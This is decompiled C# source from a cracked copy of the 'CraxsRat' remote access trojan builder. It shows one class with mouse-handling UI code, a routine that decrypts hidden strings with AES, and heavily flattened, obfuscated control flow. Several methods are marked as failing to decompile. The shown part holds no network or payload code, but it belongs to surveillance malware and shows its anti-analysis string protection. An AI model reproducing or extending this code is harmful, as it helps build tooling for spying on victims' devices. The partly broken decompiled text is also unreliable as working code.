// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ResizeableControl
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using dummy_ptr;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  public class ResizeableControl
  {
    internal information \u0024VB\u0024ResumableLocal_information\u0024465;
    internal string[] \u0024VB\u0024ResumableLocal_SPL_lines\u0024466;
    internal int \u0024VB\u0024ResumableLocal_rowID\u0024467;
    internal DataGridViewComboBoxCell \u0024VB\u0024ResumableLocal_cell\u0024468;
    internal List<string> \u0024VB\u0024ResumableLocal_ListItems\u0024469;

    private virtual Control mControl
    {
      [CompilerGenerated, SpecialName] get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._mControl;
      }
      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(((ResizeableControl) this).mControl_MouseDown);
label_1:
        int num1 = -876280942;
        Control mControl;
        EventHandler eventHandler;
        MouseEventHandler mouseEventHandler2;
        MouseEventHandler mouseEventHandler3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 * 570657941 ^ -957379303 * -1157483539)) % 10U)
          {
            case 0:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._mControl = value;
              mControl = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._mControl;
              int num3;
              num1 = num3 = mControl == null ? -459014527 : (num3 = 1310821710);
              continue;
            case 1:
              goto label_3;
            case 2:
              mouseEventHandler2 = new MouseEventHandler(((ResizeableControl) this).mControl_MouseUp);
              mouseEventHandler3 = new MouseEventHandler(((ResizeableControl) this).mControl_MouseMove);
              eventHandler = new EventHandler(((ResizeableControl) this).mControl_MouseLeave);
              mControl = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._mControl;
              num1 = (int) num2 * -2120905284 ^ 1243917215;
              continue;
            case 3:
              int num4 = mControl == null ? -1089485307 : (num4 = -102179954);
              num1 = num4 ^ (int) num2 * -388864467;
              continue;
            case 4:
              goto label_1;
            case 5:
              mControl.MouseUp -= mouseEventHandler2;
              mControl.MouseMove -= mouseEventHandler3;
              num1 = (int) num2 * 1665440565 ^ 1563218473;
              continue;
            case 6:
              mControl.MouseDown += mouseEventHandler1;
              mControl.MouseUp += mouseEventHandler2;
              mControl.MouseMove += mouseEventHandler3;
              num1 = (int) num2 * 1172601130 ^ 984715369;
              continue;
            case 7:
              mControl.MouseLeave += eventHandler;
              num1 = (int) num2 * -1179213827 ^ -981808926;
              continue;
            case 8:
              mControl.MouseLeave -= eventHandler;
              num1 = (int) num2 * 429433803 ^ -2124745632;
              continue;
            case 9:
              mControl.MouseDown -= mouseEventHandler1;
              num1 = (int) num2 * -1786873030 ^ -405184965;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    public ResizeableControl(Control Control)
    {
      // ISSUE: unable to decompile the method.
    }

    private void mControl_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 1496310473;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-48015245 * ~~(-1491103611 * (689339617 + 873305903)) - num2) * 2112677851 + ~(-1019381906 * 1645526663 * -1693509683) ^ ~216217417 ^ 1879692537 - 232101243)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).mMouseDown = true;
            num1 = (int) num3 * -895562580 ^ -1963010460;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void mControl_MouseUp(object sender, MouseEventArgs e)
    {
      ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).mMouseDown = false;
    }

    private void mControl_MouseMove(object sender, MouseEventArgs e)
    {
      // ISSUE: unable to decompile the method.
    }

    private void mControl_MouseLeave(object sender, EventArgs e)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static string LOAD_IMAGES(string v)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_1:
      int num1 = -1034308621;
      MD5CryptoServiceProvider cryptoServiceProvider;
      ICryptoTransform decryptor;
      byte[] hash;
      byte[] destinationArray;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~((-num1 - -~(--1990989191 ^ 577282753)) * -1845693707) * 312133093 - 1383188971)) % 9U)
        {
          case 0:
            string str2 = EXGuarder.\u003104A6D2F;
            destinationArray = new byte[32];
            num1 = (int) num2 * 1536680310 ^ -1867224283;
            continue;
          case 1:
            Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
            num1 = (int) num2 * 305333252 ^ 1489971133;
            continue;
          case 2:
            goto label_1;
          case 3:
            hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(v));
            Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
            num1 = (int) num2 * 1576782835 ^ -163895469;
            continue;
          case 4:
            byte[] inputBuffer = Convert.FromBase64String(EXGuarder.\u003474D0442);
            str1 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            num1 = (int) num2 * -878973493 ^ 2000808127;
            continue;
          case 5:
            rijndaelManaged.Key = destinationArray;
            rijndaelManaged.Mode = CipherMode.ECB;
            num1 = (int) num2 * 1714130836 ^ 1209338869;
            continue;
          case 6:
            cryptoServiceProvider = new MD5CryptoServiceProvider();
            num1 = (int) num2 * -1761035829 ^ -257953274;
            continue;
          case 8:
            decryptor = rijndaelManaged.CreateDecryptor();
            num1 = (int) num2 * 1727186324 ^ -428835276;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str1;
    }

    public ResizeableControl()
      : this()
    {
label_1:
      int num1 = 1584726475;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((num1 ^ ~(-762850322 - 2053508097) - ~~-1359249551 ^ 3248774 ^ -1652581750 * -216087005 + 834680383 * 655731775 - (1064071496 - 254672579 + (520410621 - 873684312)) + (313910343 * -1673229446 + -(-224074284 * -483516703))) * 1128226093 - 1629626680 ^ 1188173424) * 589001153)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ((Control) this).SetStyle(ControlStyles.EnableNotifyMessage, true);
            num1 = (int) num2 * -1066888000 ^ -477426617;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      // ISSUE: explicit non-virtual call
      RTB.HideCaret(__nonvirtual (((Control) this).Handle));
    }

    protected virtual void WndProc(ref Message m)
    {
      if (m.Msg != 522)
        goto label_4;
label_1:
      int num1 = 999502671;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(-618567825 * -2135053349 - (-1983202470 - 192066299) - (-((1773854902 ^ 1308419137) + (-1914237236 ^ 457883733)) - (num2 * 1645310495 - ~((688310347 ^ 1866905623) + 65131875 - 1495534185 * -942684135))))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            int num4 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).ctrlPressed ? -950169610 : (num4 = 61435431);
            num1 = num4 ^ (int) num3 * -2025016077;
            continue;
          case 2:
            goto label_4;
          default:
            goto label_5;
        }
      }
label_5:
      // ISSUE: explicit non-virtual call
      RTB.HideCaret(__nonvirtual (((Control) this).Handle));
      return;
label_4:
      // ISSUE: explicit non-virtual call
      __nonvirtual (((RichTextBox) this).WndProc(ref m));
      num1 = 545599037;
      goto label_2;
    }

    public enum EdgeEnum
    {
    }
  }
}
